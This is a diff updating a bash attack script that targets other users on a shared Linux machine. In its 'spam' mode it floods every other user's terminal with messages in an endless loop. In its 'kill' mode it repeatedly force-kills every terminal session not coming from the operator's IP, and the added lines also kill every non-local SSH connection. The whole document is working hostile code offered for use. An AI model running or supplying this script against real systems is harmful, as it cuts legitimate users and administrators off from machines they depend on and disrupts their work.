@@ -1,9 +1,9 @@
 #!/bin/bash
-# author : wolf/0x776F6C66/wo1fbit
+# author : wolf/0x776F6C66
 # twitter: @0x776F6C66
 
-version=0.1.0
-author="@wolf/@0x776F6C66/wolfbit"
+version=0.2.0
+author="@wolf/0x776F6C66"
 ip=$2
 
 function banner() {
@@ -26,13 +26,13 @@ function help_() {
 }
 
 function spam() {
-    spam_message="\e[33m I can still execute cmd :) Nyancat only messes display not cmd exec ....Follow on twitter:\e[32m @0x776F6C66 \e[0m"
-    echo -e "\e[31;35Your TTY: \e[31;33 `tty` \e[0m"
+    spam_message="\e[33m Hello Mate ...Follow on twitter:\e[32m @0x776F6C66 \e[0m"
+    echo -e "\e[31;35m Your TTY: \e[31;33m `tty` \e[0m"
     while :
     do
         for pty in `w -u | grep -vE "($ip)|\:1" | awk '{ print $2 }' | grep -P "pts/\\d+"`
         do
-            echo -e "$spam_message"
+            echo -e "$spam_message" > /dev/$pty && echo -e "\e[33m [*] \e[35m $pty \e[34m spammed\e[0m" || echo -e "\e[41m [!] Error \e[0m"
         done
     done
 }
@@ -43,12 +43,16 @@ function kill_(){
         echo -e "\e[31m[!] \e[33mInvalid Ip: \e[32m$ip\e[0m"
         exit 1
     fi
-    echo -e "\e[31;35Your TTY: \e[31;33 `tty` \e[0m"
+    echo -e "\e[31;35m Your TTY: \e[31;33m `tty` \e[0m"
     while :
     do
         for pty in `w -u | grep -vE "($ip)|\:1" | awk '{ print $2 }' | grep -P "pts/\\d+"`
         do
             pkill -9 -t $pty && echo -e "\e[33m[*]\e[31m Killed \e[32m $pty \e[0m "
+        done
+        for ssh_pid in `ss -tp | grep -w "ssh" | grep -v "127.0.0.1" | egrep -o "pid=[0-9]*" | grep -o "[0-9]*"`
+        do
+            kill -9 $ssh_pid && echo -e "\e[33m[*]\e[31m Killed SSH on port: \e[32m $ssh_pid \e[0m "
         done
     done
 }
@@ -57,5 +61,7 @@ banner
 case "$1" in
 "kill" ) kill_;;
 "spam" ) spam;;
-* ) help_;;
+"-h" ) help_;;
+"--help" ) help_;;
+* ) echo -e "\e[32muse -h\--help for more info.\e[0m";;
 esac
